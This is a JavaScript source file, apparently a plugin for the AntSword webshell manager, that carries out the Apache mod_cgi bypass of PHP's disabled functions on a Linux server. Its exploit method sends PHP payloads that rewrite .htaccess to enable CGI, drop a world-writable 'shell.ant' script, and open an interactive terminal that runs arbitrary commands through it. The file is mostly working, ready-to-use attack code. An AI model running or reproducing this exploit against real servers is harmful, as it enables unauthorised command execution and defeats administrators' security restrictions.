'use strict';

const Base = require('../base');
const LANG = require('../../language'); // 插件语言库
const LANG_T = antSword['language']['toastr']; // 通用通知提示
const nodeurl = require('url');

let APACHE_MOD_CGI_LANG = LANG['core']['apache_mod_cgi'];

class APACHE_MOD_CGI extends Base {
  /**
   * 
   * @param {dhtmlxObject} cell 组件
   * @param {Object} top 上层对象
   */
  constructor(cell, top) {
    super(cell, top);
    if (this.precheck() == false) {
      return;
    }
    this.infodata = {
      modcgi: false,
      writable: false,
      htaccess: false,
      localaddr: "127.0.0.1:80",
    };
    this.cell = cell;
    this.form = this.createForm(this.cell);
  }

  // 提前检测
  precheck() {
    let self = this;
    let infodata = self.top.infodata;
    if (infodata.os.toLowerCase() !== "linux") {
      toastr.error(LANG['precheck']['only_linux'], LANG_T['error']);
      return false;
    }
    return true;
  }

  createForm(cell) {
    let self = this;
    let form = cell.attachForm([{
        type: 'settings',
        position: 'label-left',
        labelWidth: 100,
        inputWidth: 300,
      }, {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'label',
          label: APACHE_MOD_CGI_LANG['title']
        }, {
          type: 'block',
          inputWidth: 'auto',
          list: [{
              type: 'settings'
            },
            {
              type: "label",
              label: `<span>${APACHE_MOD_CGI_LANG['status_cell']['modcgi']}</span>`,
            },
            {
              type: "label",
              label: `<span>${APACHE_MOD_CGI_LANG['status_cell']['writable']}</span>`,
            },
            {
              type: "label",
              label: `<span>${APACHE_MOD_CGI_LANG['status_cell']['htaccess']}</span>`,
            },
            {
              type: "newcolumn"
            },
            {
              type: "label",
              label: `<span style='color: ${self.infodata['modcgi']?"green":"red"};'>${antSword.noxss(self.infodata['modcgi']?'YES':'NO')}</span>`,
            }, {
              type: "label",
              label: `<span style='color: ${self.infodata['writable']?"green":"red"};'>${antSword.noxss(self.infodata['writable']?'YES':'NO')}</span>`,
            }, {
              type: "label",
              label: `<span style='color: ${self.infodata['htaccess']?"green":"red"};'>${antSword.noxss(self.infodata['htaccess']?'YES':'NO')}</span>`,
            },
          ],
        }]
      },
      {
        type: 'block',
        labelWidth: 100,
        inputWidth: 'auto',
        className: "display: flex;flex-direction: row;align-items: center;",
        list: [{
          type: 'label',
          label: '',
          name: 'status_label'
        }, {
          type: 'newcolumn',
          offset: 20
        }, {
          type: 'label',
          label: '',
          name: 'status_msg'
        }, ]
      },
      {
        type: 'block',
        inputWidth: 'auto',
        list: [{
          type: 'template',
          label: "Reference",
          style: "width:100%;",
          format: references
        }, ]
      }
    ], true);
    return form;
  }

  // 执行EXP, 必须有这个函数
  exploit() {
    let self = this;
    self.core = self.top.core;
    let pre_code = {
      _: `if(empty($_SERVER['HTACCESS'])) {
        @file_put_contents('.htaccess', "\\nSetEnv HTACCESS on", FILE_APPEND);
        ${self.top.opt.url.includes("127.0.0.1")?"@phpinfo();":""}
      }`,
    };
    let check_code = {
      _: `$rt = array("modcgi" => in_array('mod_cgi', @apache_get_modules()),
      "writable" => is_writable('.'),
      "htaccess" => !empty($_SERVER['HTACCESS']),
      );
      echo json_encode($rt);`
    };
    new Promise((res, rej) => {
        self.core
          .request(pre_code)
          .then((response) => {
            let re = /<tr><td class="e">Hostname:Port\s+?<\/td><td class="v">(.+?)\s+?<\/td><\/tr>/;
            if (self.top.opt.url.includes('127.0.0.1')) {
              if (re.test(response['text'])) {
                self.infodata['localaddr'] = RegExp.$1;
              }
            }
            self.core
              .request(check_code)
              .then((_ret) => {
                let _res = antSword.unxss(_ret['text']);
                self.infodata = Object.assign(self.infodata, JSON.parse(_res));
                self.form = self.createForm(self.cell);
                res(self.infodata);
              }).catch((err) => {
                rej(err);
              })
          }).catch((err) => {
            rej(err);
          })
      }).then(info => {
        if (!(info.modcgi && info.htaccess && info.writable)) {
          rej('check failed');
        }
      })
      .then(() => {
        let expcode = {
          _: `@copy(".htaccess", ".htaccess.bak");
@file_put_contents('.htaccess', "Options +ExecCGI\\nAddHandler cgi-script .ant");
@file_put_contents('shell.ant', "#!/bin/sh\\n\\necho&ls");
@chmod("shell.ant", 0777);`
        };
        self.core.request(expcode)
          .then(() => {
            new antSword.module.terminal(self.top.opt, {
              exec: (arg = {
                bin: '/bin/bash',
                cmd: ''
              }) => {
                let content = Buffer.from(`#!${arg['bin']}\necho&&${arg['cmd']}`).toString('base64');
                let target = "";
                if (self.top.opt.url.includes('127.0.0.1')) {
                  target = `$url['scheme']."://${self.infodata['localaddr']}".$url['path'];`;
                } else {
                  target = `$url['scheme']."://".$_SERVER['HTTP_HOST'].$url['path'];`;
                }
                return {
                  _: `@file_put_contents('shell.ant', base64_decode("${content}"));
$url=parse_url("${nodeurl.resolve(self.top.opt.url, 'shell.ant')}");
$target=${target};
echo @file_get_contents($target);`,
                  // header("Location: ${nodeurl.resolve(self.top.opt.url, 'shell.ant')}");
                  // echo @file_get_contents("${nodeurl.resolve(self.top.opt.url, 'shell.ant')}");
                }
              }
            });
          })
          .catch(err => {
            throw err;
          });
      })
      .catch((err) => {
        toastr.error(`${LANG['error']}: ${JSON.stringify(err)}`, LANG_T['error']);
      });
  }
}

function references(name, value) {
  let refs = {
    "AntSword-Labs/bypass_disable_functions/3": "https://github.com/AntSwordProject/AntSword-Labs/blob/master/bypass_disable_functions/3",
    "Bypass PHP system functions disabled via mod_cgi (0cx.cc)": "http://0cx.cc/bypass_disabled_via_mod_cgi.jspx",
    "github.com/l3m0n/Bypass_Disable_functions_Shell": "https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/apache_mod_cgi/exp.php",
  };
  let ret = "";
  Object.keys(refs).map((k) => {
    ret += `<li style="padding-bottom: 10px;"><a href='${refs[k]}' target='blank'>${k}</a></li>`;
  })
  return `<div class='simple_link'><ul>${ret}</ul></div>`;
}

module.exports = APACHE_MOD_CGI;